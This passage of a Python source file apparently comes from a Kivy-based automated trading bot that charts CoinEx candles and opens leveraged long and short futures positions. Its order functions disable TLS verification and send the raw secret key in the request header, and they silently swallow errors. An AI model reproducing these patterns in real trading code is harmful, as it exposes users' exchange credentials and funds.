        if self.contador_inicial_operacion==0:            
            self.comprovar_primer_pred=self.pivot_predx1
            self.comprovar_primer_pred_comparador_dinamico=self.pivot_predx1
            self.contador_inicial_operacion=1
            self.widget15_2333.text='Robot\n(WAIT)'
            self.rev_wait=1
        else:                       
            if self.continuidadtendencia1 == self.pivot_predx1==self.pivot_predx==self.pivot_pincipal and self.continuidadtendencia1 != "Neutral":               
                Clock.schedule_once(self.AUTO_3)
                self.widget15_2333.text='Robot\n(ON)'
                if hasattr(self, 'ejecutor_xxxxxx'):
                    Clock.unschedule(self.ejecutor_xxxxxx)
                    self.ejecutor_xxxxxx=0
                else:
                    None
            else:
                None 
#--------------------------------------------------------------------------------------------------
    def AUTO(self, instance):
        self.comprobar_iniciar=self.comprobar_iniciar+1
        if self.comprobar_iniciar==1:
            self.ejecutor_xxxxxx = Clock.schedule_interval(self.AUTO_2, 1)
        else:            
            try:
                if hasattr(self, 'AUTO_OPERACION'):
                    Clock.unschedule(self.AUTO_OPERACION)
                    self.AUTO_OPERACION=0
                else:
                    None
                self.call_conador_operacion=0
                self.call_conador_operacionp=0            
                try:
                    if hasattr(self, 'ejecutor_registro_beneficio_call_put'):
                        Clock.unschedule(self.ejecutor_registro_beneficio_call_put)
                        self.ejecutor_registro_beneficio_call_put=0
                    else:
                        None
                except:
                    None 
                try:
                    if hasattr(self, 'actualizador_take_stop_call'):
                        Clock.unschedule(self.actualizador_take_stop_call)
                        self.actualizador_take_stop_call=0
                    else:
                        None
                except:
                    None
                self.widget15_2333.background_color=color_botones
                self.widget15_2333xxx.trigger_action() 
                self.widget15_2333.text='Robot\n(OFF)'                
                self.rev_cierre_por_stop_loss=1
                self.rev_wait=0
                self.detector_zona_problematica=0               
                self.pivot_possible_pred_list.clear()
                self.pivot_possible_pred_list1.clear()
            except:
                None
            try:
                if hasattr(self, 'ejecutor_xxxxxx'):
                    Clock.unschedule(self.ejecutor_xxxxxx)
                    self.ejecutor_xxxxxx=0
                else:
                    None
            except:
                None
            self.comprobar_iniciar=0
            self.contador_inicial_operacion=0
            self.comprovar_primer_pred=0
            self.comprovar_primer_pred_comparador_dinamico=0
            self.pivot_possible_pred_list.clear()
            self.pivot_possible_pred_list1.clear()
            self.operau = 0
#---COINEX ENTRAR OPERACION LONG-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def Comprar_call_COINEX(self, dt):
        if self.spinner_22XXX=="" and self.spinner_22XXX1=="":
            None
        else:
            api_key = self.spinner_22XXX  # Reemplaza con tu clave API
            secret_key = self.spinner_22XXX1  # Reemplaza con tu clave secreta
            base_url = 'https://api.coinex.com/v1/'
            try:
                # Función para firmar la solicitud
                #------------------------------------------------------------------------------------------------------------------------------
                def create_signature(params, secret_key):
                    sign = '&'.join([f"{key}={value}" for key, value in sorted(params.items())])
                    sign += f"&secret_key={secret_key}"
                    return sign
                # Función para abrir una operación LONG
                #------------------------------------------------------------------------------------------------------------------------------
                def open_long_position():
                    endpoint = 'contract/market/positions'
                    url = base_url + endpoint
                
                    params = {
                        'market': self.graficaSSS,
                        'side': 1,  # 1 para LONG
                        'amount': self.Inversionttt,  # Tamaño de posición (USD)
                        'leverage': self.Apalancamiento_entradattt,  # Apalancamiento
                        'access_id': api_key,
                        'tonce': str(int(time.time() * 1000))
                    }
                    headers = {
                        'Authorization': create_signature(params, secret_key)
                    }
                    response = requests.post(url, headers=headers, data=params, verify=False)
                    print("Operación LONG:", response.json())
                open_long_position()
            except:
                None        
#---COINEX ENTRAR OPERACION SHORT--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------       
    def Venta_put_COINEX(self, dt):
        if self.spinner_22XXX=="" and self.spinner_22XXX1=="":
            None
        else:
            api_key = self.spinner_22XXX  # Reemplaza con tu clave API
            secret_key = self.spinner_22XXX1  # Reemplaza con tu clave secreta
            base_url = 'https://api.coinex.com/v1/'
            try:
                # Función para firmar la solicitud
                #------------------------------------------------------------------------------------------------------------------------------
                def create_signature(params, secret_key):
                    sign = '&'.join([f"{key}={value}" for key, value in sorted(params.items())])
                    sign += f"&secret_key={secret_key}"
                    return sign
                # Función para abrir una operación SHORT
                #------------------------------------------------------------------------------------------------------------------------------
                def open_short_position():
                    endpoint = 'contract/market/positions'
                    url = base_url + endpoint
                
                    params = {
                        'market': self.graficaSSS,
                        'side': 2,  # 2 para SHORT
                        'amount': self.Inversiontttp,  # Tamaño de posición (USD)
                        'leverage': self.Apalancamiento_entradatttp,  # Apalancamiento
                        'access_id': api_key,
                        'tonce': str(int(time.time() * 1000))
                    }
                    headers = {
                        'Authorization': create_signature(params, secret_key)
                    }
                    response = requests.post(url, headers=headers, data=params, verify=False)               
                    print("Operación SHORT:", response.json())
                open_short_position()
            except:
                None
#---COINEX CERRAR OPERACIONES--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def Cerrar_operaciones_COINEX(self, dt):
        if self.spinner_22XXX=="" and self.spinner_22XXX1=="":
            None
        else:
            try:
                api_key = self.spinner_22XXX  # Reemplaza con tu clave API
                secret_key = self.spinner_22XXX1  # Reemplaza con tu clave secreta
                endpoint = 'contract/market/close_positions'
                base_url = 'https://api.coinex.com/v1/'        
                # Función para firmar la solicitud
                #------------------------------------------------------------------------------------------------------------------------------
                def create_signature(params, secret_key):
                    sign = '&'.join([f"{key}={value}" for key, value in sorted(params.items())])
                    sign += f"&secret_key={secret_key}"
                    return sign
                #------------------------------------------------------------------------------------------------------------------------------
                def close_all_positions():            
                    url = base_url + endpoint        
                    params = {
                        'market': self.graficaSSS,
                        'access_id': api_key,
                        'tonce': str(int(time.time() * 1000))
                    }
                    headers = {
                        'Authorization': create_signature(params, secret_key)
                    }
                    response = requests.post(url, headers=headers, data=params, verify=False)                 
                    print("Todas las posiciones cerradas:", response.json())
                close_all_positions()
            except:
                None   
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
    def Comprar_call(self, instance):
        try:  
            if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:                      
                try:
                    self.Inversionttt=int(self.spinner_20.text)
                    self.spinner_20.text=str(self.Inversionttt)
                except:
                    self.spinner_20.text="2"
                    self.Inversionttt=int(self.spinner_20.text)       
                self.Precio_entradattt=self.conseguir_precio_en_tiempo_real
                self.Direccion_entradattt="Call"
                self.Apalancamiento_entradattt=int(self.spinner_21.text)           
                datos_entrada=f"Inv: {self.Inversionttt} USD\nEnt: {self.Precio_entradattt}\nOpt: {self.Direccion_entradattt}\nLev: {self.Apalancamiento_entradattt}x"
                self.compra_call_line= self.ax.axhline(y= self.Precio_entradattt, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.compra_call_entrada= self.ax.text(self.terminacionejexxx-1, self.Precio_entradattt,datos_entrada,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="green",alpha=0.7, edgecolor="green", boxstyle='larrow'))            
                self.call_conador_operacion=1 
                self.saldo_inicial=self.registro_saldo[-1]
                self.optimizar_calculo_beneficio=1                             
                variable_regulacion_take_actividad1 = (self.promedio_V-1)*self.variable_act_take
                variable_regulacion_take_actividad2 = (self.promedio_V-1)*self.variable_act_stop
                self.comprobar_si_A_y_B_aparecen_1 = 0
                self.comprobar_si_A_y_B_aparecen_2 = 0
                self.comprobar_si_A_y_B_aparecen_3 = 0
                self.comprobar_si_A_y_B_aparecen_1A = 0
                self.comprobar_si_A_y_B_aparecen_2A = 0        
                #----------------------------------Colocar take profit predeterminado liquidacion--------------------------------------------------------------------
                limite_take_precio = self.Precio_entradattt+(variable_regulacion_take_actividad1/int(self.Apalancamiento_entradattt))*self.Precio_entradattt            
                self.limite_take=float("{0:.5f}".format(limite_take_precio))           
                datos_entrada_take=f"TP: {self.limite_take}"
                self.compra_call_line_take= self.ax.axhline(y= self.limite_take, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.compra_call_entrada_take= self.ax.text(self.terminacionejexxx-self.deplx, self.limite_take,datos_entrada_take,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='left', bbox=dict(facecolor="green",alpha=0.7, edgecolor="green", boxstyle='round4'))            
                self.spinner_22.text=f"{self.limite_take}"
                #----------------------------------Colocar stop loss predeterminado liquidacion--------------------------------------------------------------------                               
                limite_stop_precio = self.Precio_entradattt-(variable_regulacion_take_actividad2/int(self.Apalancamiento_entradattt))*self.Precio_entradattt                   
                self.limite_stop=float("{0:.5f}".format(limite_stop_precio))                         
                datos_entrada_stop=f"SL: {self.limite_stop}"
                self.compra_call_line_stop= self.ax.axhline(y= self.limite_stop, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                self.compra_call_entrada_stop= self.ax.text(self.terminacionejexxx-self.deplx, self.limite_stop,datos_entrada_stop,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='left', bbox=dict(facecolor="red",alpha=0.7, edgecolor="red", boxstyle='round4'))            
                self.spinner_23.text=f"{self.limite_stop}"
                self.actualizador_take_stop_call= Clock.schedule_interval(self.actualizar_limite_take_profit_para_call, 2)
                self.widget15_1.text="Call\n(1)"
                #indiece_develop_saldo=len(self.registro_saldo)
                #self.opera_vert = self.ax25.axvline(x=indiece_develop_saldo-1, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                #self.opera_vert_text= self.ax25.text(indiece_develop_saldo-1, self.registro_saldo[-1],"C",color ="white", fontweight = "normal",fontsize=6,va='center',  ha='center', bbox=dict(facecolor="green", edgecolor="green", boxstyle='circle'))                      
                Clock.schedule_once(self.Comprar_call_COINEX) 
                self.figz.canvas.draw_idle()
            else:
                None
        except:
            None
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
    def Comprar_put(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            try:
                self.Inversiontttp=int(self.spinner_20.text)
                self.spinner_20.text=str(self.Inversiontttp)
            except:
                self.spinner_20.text="2"
                self.Inversiontttp=int(self.spinner_20.text)                               
            self.Precio_entradatttp=self.conseguir_precio_en_tiempo_real
            self.Direccion_entradatttp="Put"
            self.Apalancamiento_entradatttp=int(self.spinner_21.text)            
            datos_entradap=f"Inv: {self.Inversiontttp} USD\nEnt: {self.Precio_entradatttp}\nOpt: {self.Direccion_entradatttp}\nLev: {self.Apalancamiento_entradatttp}x"
            self.compra_call_linep= self.ax.axhline(y= self.Precio_entradatttp, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.compra_call_entradap= self.ax.text(self.terminacionejexxx-1, self.Precio_entradatttp,datos_entradap,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="red",alpha=0.7, edgecolor="red", boxstyle='larrow'))            
            self.call_conador_operacionp=1
            self.saldo_inicial=self.registro_saldo[-1]
            self.optimizar_calculo_beneficio=1                    
            variable_regulacion_take_actividad1 = (self.promedio_V-1)*self.variable_act_take
            variable_regulacion_take_actividad2 = (self.promedio_V-1)*self.variable_act_stop
            self.comprobar_si_A_y_B_aparecen_1 = 0
            self.comprobar_si_A_y_B_aparecen_2 = 0
            self.comprobar_si_A_y_B_aparecen_3 = 0
            self.comprobar_si_A_y_B_aparecen_1A = 0
            self.comprobar_si_A_y_B_aparecen_2A = 0
            #----------------------------------Colocar take profit predeterminado liquidacion--------------------------------------------------------------------
            limite_take_precio = self.Precio_entradatttp-(variable_regulacion_take_actividad1/int(self.Apalancamiento_entradatttp))*self.Precio_entradatttp            
            self.limite_take=float("{0:.5f}".format(limite_take_precio))           
            datos_entrada_take=f"TP: {self.limite_take}"
            self.compra_call_line_take= self.ax.axhline(y= self.limite_take, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.compra_call_entrada_take= self.ax.text(self.terminacionejexxx-self.deplx, self.limite_take,datos_entrada_take,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='left', bbox=dict(facecolor="green",alpha=0.7, edgecolor="green", boxstyle='round4'))            
            self.spinner_22.text=f"{self.limite_take}"
            #----------------------------------Colocar stop loss predeterminado liquidacion--------------------------------------------------------------------                                           
            limite_stop_precio = self.Precio_entradatttp+(variable_regulacion_take_actividad2/int(self.Apalancamiento_entradatttp))*self.Precio_entradatttp                
            self.limite_stop=float("{0:.5f}".format(limite_stop_precio))            
            datos_entrada_stop=f"SL: {self.limite_stop}"
            self.compra_call_line_stop= self.ax.axhline(y= self.limite_stop, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.compra_call_entrada_stop= self.ax.text(self.terminacionejexxx-self.deplx, self.limite_stop,datos_entrada_stop,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='left', bbox=dict(facecolor="red",alpha=0.7, edgecolor="red", boxstyle='round4'))            
            self.spinner_23.text=f"{self.limite_stop}"
            self.actualizador_take_stop_call= Clock.schedule_interval(self.actualizar_limite_take_profit_para_put, 2)
            self.widget15_2.text="Put\n(1)"            
            #indiece_develop_saldo=len(self.registro_saldo)
            #self.opera_vert = self.ax25.axvline(x=indiece_develop_saldo-1, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            #self.opera_vert_text= self.ax25.text(indiece_develop_saldo-1, self.registro_saldo[-1],"P",color ="white", fontweight = "normal",fontsize=6,va='center',  ha='center', bbox=dict(facecolor="red", edgecolor="red", boxstyle='circle'))                      
            Clock.schedule_once(self.Venta_put_COINEX)             
            self.figz.canvas.draw_idle()
        else:
            None
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
    def close_app(self, instance):
        sys.exit()
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def abrir_enlase1(self, instance):
        webbrowser.open("https://www.coinex.com/register?rc=cgus5")
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                 
    def abrir_enlase1xxx(self, instance):
        webbrowser.open("https://chat.whatsapp.com/CpoRvgxwUOLHjzPWgN1efD")
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def _update_rect(self, instance, value):
        # Actualizar el tamaño y la posición del rectángulo
        self.rect.pos = instance.pos
        self.rect.size = instance.size
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def precio_real(self, dt):
        try:        
            url = 'https://api.coinex.com/v1/market/kline'
            params = {
                'market': self.graficaSSS,  # Par de mercado para BTC
                'type': "1min",       # Tipo de vela (1 minuto)
                'limit': 1          # Número de velas a obtener
            }            
            # Realizar la solicitud GET a la API
            response = requests.get(url, params=params, verify=False)    
            data = response.json()           
            if response.status_code == 200 and 'data' in data:
                # Extraer las velas
                velas = data['data']
                if velas is not None:
                    for i in velas:
                        timestamp, open_price, close_price, high_price, low_price, volume, deal = i
                        self.precio_running=float(close_price)
                else:
                    None
            else:
                None
        except:
            None
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def paste_from_clipboard1(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        self.widget3.text = Clipboard.paste()              
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------          
    def paste_from_clipboard2(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        self.widget3xx.text = Clipboard.paste()
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                  
    def paste_from_clipboard3(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        self.widget4.text = Clipboard.paste()
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def algoritmo_detector_de_donde_se_encuentra_el_precio_pro5fibo(self, dt):      
        try:
            self.listalerta.clear()                                        
            x1= self.ValordeX1marcador+(self.ancho_cuerpo)  # Coordenadas x de la recta roja vertical               
            try:                       
                m = (self.RRRY1[-1] - self.RRRY1[0]) / (self.RRRX1[-1] - self.RRRX1[0])
                b = self.RRRY1[0] - m * self.RRRX1[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None                        
            try:                       
                m = (self.RRRY5[-1] - self.RRRY5[0]) / (self.RRRX5[-1] - self.RRRX5[0])
                b = self.RRRY5[0] - m * self.RRRX5[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY6[-1] - self.RRRY6[0]) / (self.RRRX6[-1] - self.RRRX6[0])
                b = self.RRRY6[0] - m * self.RRRX6[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY13[-1] - self.RRRY13[0]) / (self.RRRX13[-1] - self.RRRX13[0])
                b = self.RRRY13[0] - m * self.RRRX13[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY17[-1] - self.RRRY17[0]) / (self.RRRX17[-1] - self.RRRX17[0])
                b = self.RRRY17[0] - m * self.RRRX17[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None                        
            try:                       
                m = (self.RRRY18[-1] - self.RRRY18[0]) / (self.RRRX18[-1] - self.RRRX18[0])
                b = self.RRRY18[0] - m * self.RRRX18[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY1S[-1] - self.RRRY1S[0]) / (self.RRRX1S[-1] - self.RRRX1S[0])
                b = self.RRRY1S[0] - m * self.RRRX1S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5S[-1] - self.RRRY5S[0]) / (self.RRRX5S[-1] - self.RRRX5S[0])
                b = self.RRRY5S[0] - m * self.RRRX5S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY6S[-1] - self.RRRY6S[0]) / (self.RRRX6S[-1] - self.RRRX6S[0])
                b = self.RRRY6S[0] - m * self.RRRX6S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None                        
            try:                       
                m = (self.RRRY13S[-1] - self.RRRY13S[0]) / (self.RRRX13S[-1] - self.RRRX13S[0])
                b = self.RRRY13S[0] - m * self.RRRX13S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY17S[-1] - self.RRRY17S[0]) / (self.RRRX17S[-1] - self.RRRX17S[0])
                b = self.RRRY17S[0] - m * self.RRRX17S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY18S[-1] - self.RRRY18S[0]) / (self.RRRX18S[-1] - self.RRRX18S[0])
                b = self.RRRY18S[0] - m * self.RRRX18S[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5S22[-1] - self.RRRY5S22[0]) / (self.RRRX5S22[-1] - self.RRRX5S22[0])
                b = self.RRRY5S22[0] - m * self.RRRX5S22[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5xx[-1] - self.RRRY5xx[0]) / (self.RRRX5xx[-1] - self.RRRX5xx[0])
                b = self.RRRY5xx[0] - m * self.RRRX5xx[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
        
            try:                       
                m = (self.RRRY5ZZ[-1] - self.RRRY5ZZ[0]) / (self.RRRX5ZZ[-1] - self.RRRX5ZZ[0])
                b = self.RRRY5ZZ[0] - m * self.RRRX5ZZ[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY17Szz[-1] - self.RRRY17Szz[0]) / (self.RRRX17Szz[-1] - self.RRRX17Szz[0])
                b = self.RRRY17Szz[0] - m * self.RRRX17Szz[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None                        
            try:                       
                m = (self.RRRY1Snn[-1] - self.RRRY1Snn[0]) / (self.RRRX1Snn[-1] - self.RRRX1Snn[0])
                b = self.RRRY1Snn[0] - m * self.RRRX1Snn[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY13nn[-1] - self.RRRY13nn[0]) / (self.RRRX13nn[-1] - self.RRRX13nn[0])
                b = self.RRRY13nn[0] - m * self.RRRX13nn[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5qq[-1] - self.RRRY5qq[0]) / (self.RRRX5qq[-1] - self.RRRX5qq[0])
                b = self.RRRY5qq[0] - m * self.RRRX5qq[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY1l[-1] - self.RRRY1l[0]) / (self.RRRX1l[-1] - self.RRRX1l[0])
                b = self.RRRY1l[0] - m * self.RRRX1l[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5qqm[-1] - self.RRRY5qqm[0]) / (self.RRRX5qqm[-1] - self.RRRX5qqm[0])
                b = self.RRRY5qqm[0] - m * self.RRRX5qqm[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            try:                       
                m = (self.RRRY5e[-1] - self.RRRY5e[0]) / (self.RRRX5e[-1] - self.RRRX5e[0])
                b = self.RRRY5e[0] - m * self.RRRX5e[0]
                intersection_x = x1
                intersection_y = m * intersection_x + b
                self.listalerta.append(intersection_y)
                #----------------------------------------------------------------
            except:
                None
            dhddhhdhd=self.ValordeYmarcador
            Axxx=sorted(self.listalerta)
            numero_determinado = dhddhhdhd            
            # Calcular las diferencias absolutas
            diferenciasxxx = [abs(x - numero_determinado) for x in Axxx]            
            # Encontrar el índice del valor mínimo de las diferencias
            indicexxx = diferenciasxxx.index(min(diferenciasxxx))            
            # Obtener el valor más cercano y su índice
            valor_mas_cercanoxxx = Axxx[indicexxx]
            ale=float("{0:.5f}".format(valor_mas_cercanoxxx))
            if dhddhhdhd>ale:
                color_Gxxxx="green"
                hsdhjsjd="Call:"
            elif dhddhhdhd<ale:
                color_Gxxxx="red"
                hsdhjsjd="Put:"
            else:
                color_Gxxxx="blue"
                hsdhjsjd="Call:"
            self.contol_precio=ale        
            if dhddhhdhd>ale:
                color_Gxxxx111="red"
                jxxx=Axxx[indicexxx+1]
                ale111=float("{0:.5f}".format(jxxx))
                hsdhjsjd111="Put:"                
            elif dhddhhdhd<ale:
                color_Gxxxx111="green"
                hsdhjsjd111="Call:"
                jxxx=Axxx[indicexxx-1]
                ale111=float("{0:.5f}".format(jxxx))
            else:
                color_Gxxxx111="blue"
                jxxx=Axxx[indicexxx-1]
                ale111=float("{0:.5f}".format(jxxx))
                hsdhjsjd111="Call:"
            try:
                self.contol_precio=ale  
                self.precioclave222.set_position((self.terminacionejexxx-self.xdespl,self.contol_precio))        
                self.precioclave222.set_text(f"{hsdhjsjd} {self.contol_precio}")                            
                self.precioclave222xxx.set_ydata([self.contol_precio])
                self.precioclave222xxx.set_color(color_Gxxxx)
                self.precioclave222.set_bbox(dict(facecolor=color_Gxxxx, edgecolor=color_Gxxxx, boxstyle='round4'))
            except:
                None            
            try:
                self.contol_precio111=ale111
                self.precioclave222111.set_position((self.terminacionejexxx-self.xdespl,self.contol_precio111))        
                self.precioclave222111.set_text(f"{hsdhjsjd111} {self.contol_precio111}")                            
                self.precioclave222xxx111.set_ydata([self.contol_precio111])
                self.precioclave222xxx111.set_color(color_Gxxxx111)            
                self.precioclave222111.set_bbox(dict(facecolor=color_Gxxxx111, edgecolor=color_Gxxxx111, boxstyle='round4'))
            except:
                None            
            self.figz.canvas.draw_idle()      
        except:
            None   
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_movex(self, event):
        # Check if the event is within the axes
        if event.inaxes is not None:
            x, y = event.xdata, event.ydata
            numero= x
            if numero<1:
                numero=1
            else:
                None                                
            numero_redondeado = round(numero)                           
            # Si el número redondeado es impar, sumamos 1 para llevarlo al par más cercano
            if numero_redondeado % 2 != 0:
                numero_par = numero_redondeado + 1
            else:
                numero_par = numero_redondeado
            self.linexkx.set_ydata([y, y])
            try:
                jsdfjj=int(numero_par/2-1)-self.hdahdahcontador
                self.ultimo_poligono1 = self.lista_poligonos[jsdfjj]
                djejdje=self.ultimo_poligono1.xy
                eje_y = [djejdje[1] for djejdje in djejdje]
                valor_1_max = eje_y[6]
                valor_1_min = eje_y[0]
                valor_1_open = eje_y[2]
                valor_1_close = eje_y[4]
                asda=f"{y:.5f}"
                # Crear el texto con las variables en columnas                 
                RRRRDDE="Japanese candle"
                QWDQWLDL=self.TIPOVELA                                 
                texto_columnas1 = f"{RRRRDDE} at {QWDQWLDL}\nMaximum: {valor_1_max}\nOpen: {valor_1_open}\nClose: {valor_1_close}\nMinimum: {valor_1_min}\nPrice: {asda}"
                self.textxkx.set_text(texto_columnas1)
                if valor_1_open-valor_1_close>0:
                    color_cua="red"
                elif valor_1_open-valor_1_close<0:
                    color_cua="green"
                else:
                    color_cua="white"
                if color_cua=="red" or color_cua=="green":
                    texto_columnas1 = f"{RRRRDDE} at {QWDQWLDL}\nMaximum: {valor_1_max}\nOpen: {valor_1_open}\nClose: {valor_1_close}\nMinimum: {valor_1_min}\nPrice: {asda}"
                    self.textxkx.set_text(texto_columnas1)
                    self.textxkx.set_bbox(dict(facecolor=color_cua, edgecolor=color_cua, boxstyle='round4'))
                    self.textxkx.set_color(color="white" )
                    self.linexkx.set_color(color_cua)  # Línea horizontal
                    self.vlinex.set_color(color_cua)
                else:
                    texto_columnas1 = "Gap (No data)"
                    self.textxkx.set_text(texto_columnas1)
                    self.textxkx.set_bbox(dict(facecolor="black", edgecolor="black", boxstyle='round4'))
                    self.textxkx.set_color(color="white" )
                    self.linexkx.set_color("black")  # Línea horizontal
                    self.vlinex.set_color("black") 
            except:                
                yyuu="Price"                                                                        
                self.textxkx.set_text(f"{yyuu}: {y:.5f}")
                self.textxkx.set_bbox(dict(facecolor="black", edgecolor="black", boxstyle='round4'))
                self.linexkx.set_color("black")  # Línea horizontal
                self.vlinex.set_color("black") 
                
            self.textxkx.set_position((numero_par-1.25, y))                            
            self.vlinex.set_xdata([numero_par-1.25, numero_par-1.25])
            self.figz.canvas.draw_idle()
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def hacer_lista(self, dt):
        self.instancias_a_eliminar_contador = 0
        self.volumen_market.clear()
        url = 'https://api.coinex.com/v1/market/kline'
        params = {
            'market': self.graficaSSS,  # Par de mercado para BTC
            'type': self.grafica,       # Tipo de vela (1 minuto)
            'limit': 60          # Número de velas a obtener
        }       
        # Realizar la solicitud GET a la API
        response = requests.get(url, params=params, verify=False)      
        data = response.json()        
        if response.status_code == 200 and 'data' in data:
            # Extraer las velas
            velas = data['data']
            if velas is not None:
                for i in velas:
                    timestamp, open_price, close_price, high_price, low_price, volume, deal = i
                    apertura_vela_Eoo =  float(open_price)
                    cierre_vela_Eoo = float(close_price)
                    valormax_vela_Eoo = float(high_price)
                    valormin_vela_Eoo = float(low_price)
                    id_velascerradas = timestamp
                    self.open_prices.append(apertura_vela_Eoo)
                    self.close_prices.append(cierre_vela_Eoo)
                    self.high_prices.append(valormax_vela_Eoo)
                    self.low_prices.append(valormin_vela_Eoo)
                    self.id_velas.append(id_velascerradas)
                    try:
                        Volumen_M=valormax_vela_Eoo/valormin_vela_Eoo
                    except:
                        Volumen_M=1
                    self.volumen_market.append(Volumen_M)                    
                for i in range(60):
                    x1=i*2
                    y1=self.open_prices[i]
                    x2=x1+self.ancho_cuerpo
                    y2=y1
                    x3=x2
                    y3=self.close_prices[i]
                    x4=x1
                    y4=y3
                    x5=(x1+x2)/2-self.ancho_mecha
                    y5=self.low_prices[i]
                    x6=(x1+x2)/2+self.ancho_mecha
                    y6=y5
                    x7=x6
                    y7=self.high_prices[i]
                    x8=x5
                    y8=y7
                    x13=x6
                    y13=y1
                    x16=x6
                    y16=y3
                    x19=x5
                    y19=y3
                    x112=x5
                    y112=y1
                    self.x1l.append(x1)
                    self.y1l.append(y1)
                    self.x2l.append(x2)
                    self.y2l.append(y2)
                    self.x3l.append(x3)
                    self.y3l.append(y3)
                    self.x4l.append(x4)
                    self.y4l.append(y4)
                    self.x5l.append(x5)
                    self.y5l.append(y5)
                    self.x6l.append(x6)
                    self.y6l.append(y6)
                    self.x7l.append(x7)
                    self.y7l.append(y7)
                    self.x8l.append(x8)
                    self.y8l.append(y8)
                    self.x13l.append(x13)
                    self.y13l.append(y13)
                    self.x16l.append(x16)
                    self.y16l.append(y16)
